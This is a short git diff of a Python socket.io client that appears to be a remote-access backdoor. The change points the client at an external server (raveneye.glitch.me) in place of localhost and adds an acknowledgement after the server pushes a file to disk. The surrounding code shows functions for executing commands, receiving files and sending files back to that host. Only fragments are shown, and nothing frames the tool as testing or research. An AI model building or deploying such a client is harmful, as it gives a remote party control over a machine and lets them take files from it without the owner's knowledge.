@@ -8,7 +8,7 @@ import os
 sio = socketio.Client()
 on = 'http://raveneye.glitch.me/'
 off = 'http://localhost:3000/'
-url = off
+url = on
 class Session:
     def __init__(self):
         self.current_directory = os.getcwd()
@@ -55,9 +55,9 @@ def execute_command(command):
 def updata(data):
     file_name = data['fileName']
     file_data = data['file']
-
     with open(file_name, 'wb') as file:
         file.write(file_data)
+    sio.emit('message', 'Received!')
 
 def send_file(file_path):
     file_name = os.path.basename(file_path)
